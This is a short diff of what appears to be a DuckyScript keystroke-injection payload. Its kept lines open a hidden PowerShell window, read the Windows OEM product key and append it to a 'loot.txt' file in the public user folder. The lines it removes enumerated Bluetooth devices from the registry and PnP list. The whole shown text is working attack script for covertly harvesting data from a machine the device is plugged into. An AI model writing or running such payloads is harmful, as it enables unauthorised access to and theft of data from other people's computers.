@@ -16,15 +16,6 @@ STRING powershell   -windowstyle hidden
 DELAY 200
 ENTER
 DELAY 500
-STRING Get-ChildItem -Path HKLM:\SYSTEM\ControlSet001\Services\DeviceAssociationService\State\Store\ | Select-String -Pattern Bluetooth
-DELAY 500
-ENTER
-DELAY 500
-STRING Get-PnpDevice | Where-Object {$_.Class -eq "Bluetooth"}
-foreach ($device in $devices) { echo $device.InstanceId }
-DELAY 500
-ENTER
-DELAY 500
 STRING Get-CimInstance -ClassName SoftwareLicensingService | Select-Object -ExpandProperty OA3xOriginalProductKey | Out-File C:\Users\Public\loot.txt -Force -append
 DELAY 500
 ENTER
